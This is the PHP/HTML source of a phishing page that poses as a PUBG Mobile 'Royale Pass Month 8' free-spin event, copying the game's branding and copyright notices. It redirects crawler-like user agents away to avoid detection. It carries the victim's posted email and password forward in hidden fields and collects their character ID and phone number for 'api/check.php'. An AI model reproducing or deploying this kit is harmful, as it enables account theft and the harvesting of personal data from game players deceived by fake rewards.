<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: Royale Pass Month 8">
<meta name="description" content="Start your free lucky spin at the Royale Pass Month 8 event. This opportunity is limited and without the need for topup. Spin and receive your rewards now!">
<meta property="og:description" content="Start your free lucky spin at the Royale Pass Month 8 event. This opportunity is limited and without the need for topup. Spin and receive your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Royale Pass Month 8">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.postimg.cc/281Z1FDD/season.png">
<title>PUBG MOBILE: Royale Pass Month 8</title>
<link rel="stylesheet" href="css/style.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">	
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<div class="navbar-subtitle">The original Battle Royale, <br> the first and the best!</div> <!--- navbar-subtitle --->
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.postimg.cc/LXJDnk6t/menu.png">
<img class="navbar-pay" src="https://i.postimg.cc/VkTdzXpQ/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="event-theme">
<div class="event-theme-icon"><img src="img/season.png"></div> <!--- event-theme-icon --->
<div class="event-theme-title">Royale Pass M8 - Bounty Legends</div> <!--- event-theme-title --->
<div class="event-theme-subtitle">Complete your account detail to continue</div> <!--- event-theme-subtitle --->
</div> <!--- event-theme-icon --->
<div class="box">
<form class="verify-form" action="api/check.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" name="playid" placeholder="Character ID" autocomplete="off" required>
<input type="number" name="phone" placeholder="Phone Number" autocomplete="off" required>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" onmousedown="buka.play()">Verify my Account</button>
</form>
</div> <!--- box --->

<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/Wx8wkq1/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2022 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->

</div> <!--- container --->

<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/click.js"></script>

</body>
</html>